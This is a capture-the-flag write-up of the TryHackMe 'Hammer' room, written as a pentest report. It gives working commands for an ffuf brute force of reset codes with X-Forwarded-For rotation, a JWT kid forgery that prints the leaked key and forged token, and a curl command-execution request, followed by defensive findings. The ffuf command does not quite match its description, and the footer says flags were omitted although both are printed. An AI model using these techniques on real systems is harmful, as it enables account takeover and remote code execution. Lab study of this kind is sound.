---
layout: writeup
title: "Hammer"
platform: THM
os: Linux
date: 2026-03-11
techniques: ["rate limit bypass", "JWT kid exploitation", "OTP brute force", "X-Forwarded-For header abuse"]
description: "X-Forwarded-For rate limit bypass for OTP brute force, JWT kid header injection for admin escalation."
---

# Hammer — Technical Report

> **Platform:** TryHackMe \
> **Difficulty:** `Medium` (Premium) \
> **Date:** 2026-03-11 \
> **Author:** 0N1S3C \
> **Scope:** Authorized TryHackMe lab environment only 

---

## 0. Executive Summary

The "Hammer" machine is a premium TryHackMe room designed to test advanced web exploitation techniques, specifically rate limit bypass and JWT token manipulation. An unauthenticated attacker could exploit a misconfigured rate limiting mechanism on the password reset functionality to brute force session-specific recovery codes, gaining access as an authenticated user. Post-authentication, a critical JWT vulnerability involving the insecure use of the `kid` (key ID) header parameter allowed forging of administrative tokens, leading to remote code execution. Immediate remediation of IP-based rate limiting logic and JWT signature verification implementation is strongly recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Hammer"** machine on TryHackMe.

**Objectives:**
- Bypass authentication mechanisms to obtain user-level access
- Achieve remote code execution (RCE)

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Log file enumeration (email discovery) → Password reset mechanism → Rate limit bypass (X-Forwarded-For rotation) → ffuf brute force (session-specific 4-digit codes) → Authenticated access (Thor) → JWT kid parameter exploitation → Forged admin token → RCE
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `curl` | HTTP requests, log file retrieval, manual testing |
| `ffuf` | Recovery code brute forcing with rate limit bypass |
| `jwt.io` | JWT token decoding and forging |
| Browser DevTools | Session management, command execution interface |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -Pn -T4 -p- <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu | Post-exploitation access |
| 1337/tcp | HTTP | Apache 2.4.41 (Ubuntu) | Main attack surface |

**Key Observations:**
- Custom port 1337 for HTTP service (thematically appropriate for the "Hammer" theme)
- PHPSESSID cookie without HttpOnly flag
- `-Pn` flag required as host blocks ICMP ping probes

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `curl`, `ffuf`, manual inspection

**Commands:**
```bash
curl http://<target-ip>:1337/
ffuf -u http://<target-ip>:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**

| Path | Status | Notes |
|------|--------|-------|
| `/` | 200 | Login page (email + password) |
| `/reset_password.php` | 200 | Password reset functionality |
| `/hmr_css/` | 301 | Bootstrap CSS assets |
| `/hmr_js/` | 301 | jQuery library |
| `/hmr_logs/` | 301 | **Critical: Exposed Apache error logs** |
| `/hmr_images/` | 301 | Static images |

**Critical HTML Comment:**
```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

This developer comment directly hinted at the `hmr_` directory naming pattern, enabling targeted enumeration.

### 5.2 Log File Analysis

**Command:**
```bash
curl http://<target-ip>:1337/hmr_logs/error.log
```

**Critical Findings:**
- Valid email discovered: `tester@hammer.thm`
- Authentication failure messages referencing `/restricted-area` and `/admin-login`
- Server configuration errors revealing internal file paths
- Evidence of rate limiting on login attempts

---

## 6. Initial Access

### 6.1 Vulnerability 1 — Rate Limit Bypass via IP Rotation

**Vulnerability:** Client IP-based rate limiting bypassable via X-Forwarded-For header manipulation \
**Location:** `POST /reset_password.php` — recovery code verification endpoint \
**Reasoning:** The password reset mechanism generated multiple session-specific 4-digit recovery codes (0000-9999 range). A rate limit of 5 attempts per session was enforced to prevent brute forcing. However, the rate limiting logic relied on the client IP address, which could be spoofed via the `X-Forwarded-For` HTTP header. By rotating this header value for each request, the server treated each attempt as originating from a different IP address, effectively bypassing the rate limit entirely.

### 6.2 Exploitation — Password Reset Brute Force

**Step 1 — Generate Wordlist:**
```bash
seq -w 0 9999 > codes.txt
```

**Step 2 — Request Password Reset:**
```bash
curl -X POST http://<target-ip>:1337/reset_password.php \
  -d "email=tester@hammer.thm" \
  -c cookies.txt
```

**Step 3 — Brute Force with Rate Limit Bypass:**
```bash
ffuf -u "http://<target-ip>:1337/reset_password.php" \
  -w codes.txt:CODE \
  -X POST \
  -d "recovery_code=CODE&s=60" \
  -H "Cookie: PHPSESSID=<session_id>" \
  -H "X-Forwarded-For: FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid" \
  -s
```

**Key Technique:** 
- The `FUZZ` keyword in the `X-Forwarded-For` header was replaced with each recovery code number (0-9999)
- Each request appeared to originate from a different IP (1.1.1.0, 1.1.1.1, 1.1.1.2, etc.)
- The `-fr "Invalid"` filter removed all responses containing "Invalid or expired recovery code!", showing only valid codes

**Result:** 
- Multiple valid recovery codes identified (e.g., 1023, 2776 for one session)
- Codes are **session-specific** — different for each password reset request
- Successfully authenticated as user `Thor`

**First Flag:** `THM{AuthBypass3D}`

---

## 7. Post-Authentication Enumeration

After logging in as Thor, the dashboard revealed:

**Command Execution Interface:**
- Input field for command execution
- Hardcoded JWT token in JavaScript source
- AJAX POST to `/execute_command.php` with Authorization Bearer token

**JWT Token Analysis:**

**Header:**
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

**Payload:**
```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1773221221,
  "exp": 1773224821,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

**Key Observations:**
- Current user has `"role": "user"`
- The `kid` header parameter points to a file path: `/var/www/mykey.key`
- Attempting to execute commands returned: `"Command not allowed"` (role-based restriction)

---

## 8. Privilege Escalation to RCE

### 8.1 Vulnerability 2 — JWT kid Parameter Exploitation

**Vulnerability:** Insecure JWT `kid` header parameter allows attacker-controlled key file selection \
**Location:** `/execute_command.php` — JWT signature verification logic \
**Reasoning:** The JWT signature verification implementation reads the signing key from the file path specified in the `kid` header parameter. No validation is performed to ensure `kid` points to a legitimate key file. An attacker can specify any readable file path, and the server will use that file's contents to verify the JWT signature. By identifying the correct key file and its contents, an attacker can forge valid JWT tokens with arbitrary claims, including elevated role assignments.

### 8.2 Exploitation — JWT Forgery

**Step 1 — Locate Signing Key:**

Directory listing revealed:
```bash
curl http://<target-ip>:1337/
# Output: 188ade1.key (among other files)
```

Retrieve key content:
```bash
curl -s http://<target-ip>:1337/188ade1.key
# Output: 56058354efb3daa97ebab00fabd7a7d7
```

**Step 2 — Forge Admin JWT:**

Using jwt.io:

**Header:**
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
```

**Payload (Modified):**
```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1773221221,
  "exp": 1773224821,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

**Signing Key:**
```
56058354efb3daa97ebab00fabd7a7d7
```

**Forged Token:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzczMjIxMjIxLCJleHAiOjE3NzMyMjQ4MjEsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.oVMfNntBXG7qMUIlEtgCfpweZpML4hOs9Fb7gVO_9ds
```

**Step 3 — Execute Commands with Forged Token:**

```bash
curl -X POST http://<target-ip>:1337/execute_command.php \
  -H "Authorization: Bearer <forged_jwt>" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<session_id>; persistentSession=<persistent_session>" \
  -d '{"command":"cat /home/ubuntu/flag.txt"}'
```

**Result:** Remote code execution achieved.

**Second Flag:** `THM{RUNANYCOMMAND1337}`

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | IP-based rate limiting bypassable via X-Forwarded-For header manipulation | 🔴 Critical | Password reset endpoint |
| 2 | JWT kid parameter allows attacker-controlled key file selection | 🔴 Critical | `/execute_command.php` JWT verification |
| 3 | Exposed Apache error logs containing valid email addresses | 🟠 High | `/hmr_logs/error.log` |
| 4 | Signing key file publicly accessible via HTTP | 🟠 High | `/188ade1.key` |
| 5 | Session-specific recovery codes predictable (4-digit numeric range) | 🟠 High | Password reset mechanism |
| 6 | PHPSESSID cookie missing HttpOnly flag | 🟡 Medium | Cookie security |
| 7 | Developer comments in HTML source revealing internal conventions | 🔵 Low | HTML source code |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Unusual `X-Forwarded-For` header patterns in access logs (sequential IP addresses)
- High volume of POST requests to `/reset_password.php` from a single source IP
- ffuf user-agent strings in HTTP request headers
- Retrieval of `.key` files via HTTP GET requests
- Execution of commands via `/execute_command.php` endpoint
- JWT tokens with modified `kid` header values in Authorization headers
- Outbound connections from web server to external IPs (if reverse shell attempted)

### 10.2 Security Weaknesses

- Rate limiting based solely on client IP address without server-side session tracking
- X-Forwarded-For header trusted without validation of proxy chain
- Recovery codes use a small keyspace (10,000 possibilities) vulnerable to brute force
- JWT signature verification uses attacker-controllable file path (`kid` parameter)
- Signing key stored in web-accessible directory with predictable filename
- No validation that `kid` points to an authorized key file location
- Lack of integrity protection on JWT header (no header validation before processing `kid`)
- Insufficient logging of authentication bypass attempts

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Implement server-side session-based rate limiting independent of client IP | Finding 1 |
| Immediate | Validate or ignore X-Forwarded-For header; implement IP allowlists for proxies | Finding 1 |
| Immediate | Restrict `kid` parameter to a predefined allowlist of key file paths | Finding 2 |
| Immediate | Move signing keys outside web root; restrict file permissions to 400 | Finding 4 |
| Short-term | Increase recovery code entropy (8+ alphanumeric characters, single-use tokens) | Finding 5 |
| Short-term | Implement account lockout after N failed reset attempts per email | Finding 1 |
| Short-term | Add HttpOnly and Secure flags to all session cookies | Finding 6 |
| Short-term | Remove or restrict access to error log files via web server configuration | Finding 3 |
| Long-term | Implement JWT best practices: use RS256 (asymmetric), validate all header claims | Finding 2 |
| Long-term | Deploy WAF rules to detect header manipulation and brute force patterns | Finding 1 |
| Long-term | Regular security code reviews focusing on authentication and authorization logic | All |

---

## 11. Lessons Learned

### Technical Insights

- **Rate limit bypass via header manipulation is a real-world technique** — many applications trust the `X-Forwarded-For` header without validating the proxy chain. Rotating this header value per request bypassed IP-based rate limiting entirely, enabling brute force of 10,000 recovery codes.
  
- **ffuf filtering is essential for finding needles in haystacks** — the `-fr "Invalid"` flag filtered out 9,997+ wrong responses, instantly revealing the 2-3 valid session-specific codes. Without this filter, manually reviewing 10,000 results would have been impractical.

- **Session-specific tokens require fresh enumeration** — the recovery codes (1023, 2776) found by another user did not work because codes are generated uniquely per session. Each password reset request creates a new set of valid codes, requiring a fresh brute force attempt.

- **JWT `kid` parameter is a dangerous feature when improperly validated** — allowing user-controlled file paths in cryptographic operations is catastrophic. The ability to specify `/dev/null` (empty file) or `/var/www/html/188ade1.key` (known file) enabled complete JWT forgery and privilege escalation from user to admin.

- **Signing keys must never be web-accessible** — the `188ade1.key` file being retrievable via HTTP GET immediately exposed the secret used to sign all JWTs. Keys should reside outside the web root with restrictive file permissions (e.g., `/etc/secrets/jwt.key` with 400 permissions).

- **Persistence and methodical enumeration win** — this box took months to solve not due to lack of skill but due to the need to systematically test every enumeration vector. The `hmr_` directory hint, log file analysis, rate limit testing, and JWT exploitation all required deliberate, structured testing.

### Methodology Improvements

- **Read HTML source code before heavy enumeration** — the `<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->` comment saved significant time by directly hinting at the directory naming pattern.

- **Always check for exposed log files** — `/hmr_logs/error.log` contained the critical `tester@hammer.thm` email that enabled the entire password reset attack chain. Exposed logs are a common but high-impact finding.

- **Test rate limits with different bypass techniques** — this box required X-Forwarded-For rotation, but other techniques (new sessions, parameter manipulation, HTTP method switching) are equally valid in different contexts. Always exhaust all rate limit bypass options systematically.

- **JWT exploitation requires understanding the implementation** — simply changing the role to "admin" is insufficient without valid signature. The `kid` parameter vulnerability was the key to forging valid signatures, demonstrating the importance of understanding how JWTs are verified server-side.

### Personal Reflection

This box was **exceptionally challenging** and required months of intermittent attempts before completion. The combination of:
- Rate limit bypass (uncommon technique requiring research)
- ffuf filtering (not immediately obvious)
- Session-specific tokens (invalidating previous attempts)
- JWT kid exploitation (advanced JWT attack)

...created a multi-layered challenge that rewarded persistence and systematic enumeration over guesswork.

The name "Hammer" was both thematic (brute forcing with a hammer) and literal (using ffuf to "hammer" the endpoint with 10,000 requests). Recognizing this hint earlier would have saved significant time.

**Key Takeaway:** Premium rooms are designed to test advanced techniques and persistence. The skills learned here (rate limit bypass, JWT exploitation, ffuf mastery) are directly applicable to real-world bug bounty and penetration testing engagements.

---

*End of Report*
*Classification: Public — flags and sensitive values omitted*
